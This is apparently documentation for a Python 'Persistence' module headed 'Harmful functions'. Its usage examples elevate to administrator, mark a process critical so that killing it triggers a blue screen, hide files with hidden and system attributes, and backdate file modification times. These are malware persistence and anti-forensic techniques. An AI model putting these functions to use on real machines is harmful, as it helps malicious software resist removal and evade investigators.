# Harmful functions

``` python
import Persistence.Admin
import Persistence.Attrib
import Persistence.CriticalProcess
import Persistence.FileDate

# Check if program started as administrator
print("Is administrator : " + str(Persistence.Admin.IsAdministrator()))
# Run program as admin
Persistence.Admin.RunAsAdmin("cmd.exe")

# Set current process is critical
# When this process is completed, a blue screen of death will appear.
# Admin rights is required
Persistence.CriticalProcess.Set()
# Set current process is not critical 
Persistence.CriticalProcess.Unset()

# Set file attrib normal
Persistence.Attrib.SetNormal("file.exe")
# Set file attrib hidden
Persistence.Attrib.SetHidden("file.exe")
# Set file attrib system
Persistence.Attrib.SetSystem("file.exe")

# Change file modification date
# To 'Mon Dec  2 20:02:47 2002' ()
# To set you date check this: unixtimestamp.com
Persistence.FileDate.SetModificationTime("test.txt", 1038848567)